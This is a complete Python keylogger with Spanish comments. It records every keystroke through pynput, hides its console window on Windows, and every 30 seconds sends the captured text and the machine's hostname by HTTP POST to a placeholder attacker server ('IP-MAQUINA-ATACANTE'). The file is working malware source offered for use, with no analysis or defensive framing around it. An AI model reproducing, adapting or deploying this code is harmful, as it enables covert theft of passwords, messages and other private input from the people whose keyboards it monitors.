import requests
import threading
import time
import os
from pynput import keyboard

SERVER_URL = "http://IP-MAQUINA-ATACANTE/log"
SEND_INTERVAL = 30  

class Keylogger:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()
        self.running = True

    def on_press(self, key):
        """Se ejecuta cada vez que se presiona una tecla"""
        try:
            keystroke = key.char
        except AttributeError:
            special = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.tab: "\t[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.caps_lock: "[CAPS]",
            }
            keystroke = special.get(key, f"[{key.name.upper()}]")

        with self.lock:
            self.buffer.append(keystroke)

    def send_logs(self):
        """Hilo que envía los logs cada SEND_INTERVAL segundos"""
        while self.running:
            time.sleep(SEND_INTERVAL)
            with self.lock:
                if self.buffer:
                    data = "".join(self.buffer)
                    self.buffer = []
                    try:
                        response = requests.post(
                            SERVER_URL,
                            json={
                                "keystrokes": data,
                                "hostname": os.getenv("COMPUTERNAME", "desconocido")
                            },
                            timeout=10
                        )                
                        with open("keystrokes.log", "a", encoding="utf-8") as f:
                            f.write(f"[{time.ctime()}] {data}\n")
                    except:
                        pass 

    def start(self):
        """Inicia el keylogger"""
        sender = threading.Thread(target=self.send_logs, daemon=True)
        sender.start()
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def run_hidden(self):
        """Versión oculta - sin ventana (para compilar con --noconsole)"""
        if os.name == "nt":
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        
        sender = threading.Thread(target=self.send_logs, daemon=True)
        sender.start()
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    kl = Keylogger()
    
    kl.run_hidden()  
    